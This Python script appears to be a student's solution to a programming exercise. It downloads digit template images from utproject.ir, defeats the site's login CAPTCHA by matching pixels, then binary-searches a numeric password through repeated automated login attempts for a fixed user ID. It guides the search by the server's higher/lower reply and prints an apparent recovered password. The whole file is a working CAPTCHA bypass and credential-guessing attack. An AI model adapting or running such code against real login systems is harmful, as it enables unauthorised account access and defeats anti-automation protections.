def done():
    from PIL import Image
    from io import BytesIO
    import requests
    import json
    from requests.sessions import Session
    lis=[]
    def imagek(a):
       imt = requests.get("http://utproject.ir/bp/Numbers/%d.jpg"%a)
       fileimt = BytesIO(imt.content)
       imt= Image.open(fileimt)
       imt = imt.convert("L")
       return imt
    for i in range(10):
        lis.append(imagek(i))
    def comp(a,b,k):
        t = b.load()
        h = a.load()
        x2 = b.size[0]
        y2 = b.size[1]
        for i in range(x2):
            for j in range(y2):
                if (t[i,j] != h[i+k,j]):
                    return 0
        return 1
    ses=Session()
    ri=ses.get("http://utproject.ir/bp/image.php")
    file=BytesIO(ri.content)
    img=Image.open(file)
    img.save("x.png")
    Image.open("x.png")
    img = img.convert("L")
    def aks_khan(t):
        o=""
        for i in range(5):
            for j in lis:
                if comp(t,j,40*i) == 1:
                    o = o + str(lis.index(j))
        return o
    r=ses.post("http://utproject.ir/bp/login.php",data={"username":"610300116",
      "password":"1000000000000000000000","captcha":str(aks_khan(img))})
    y = json.loads(r.text)
    n = 1000000000000000000000
    def bin_hack_mola():
        t=2
        low = 0
        high = n
        marhale=0
        while(t !=0 ):
            marhale += 1
            k = (low + high)//2
            ri=ses.get("http://utproject.ir/bp/image.php")
            file=BytesIO(ri.content)
            img=Image.open(file)
            img.save("x.png")
            Image.open("x.png")
            img = img.convert("L")
            r = ses.post("http://utproject.ir/bp/login.php", data={"username": "610300116",
                  "password": str(k),"captcha": str(aks_khan(img))})
            y = json.loads(r.text)
            if (y["stat"]) == 1:
                high = k
                t = 1
            elif (y["stat"]) == -1:
                low = k
                t = -1
            else:
                return k
    print(bin_hack_mola())
print("610300116")
print("43858036164422529722")

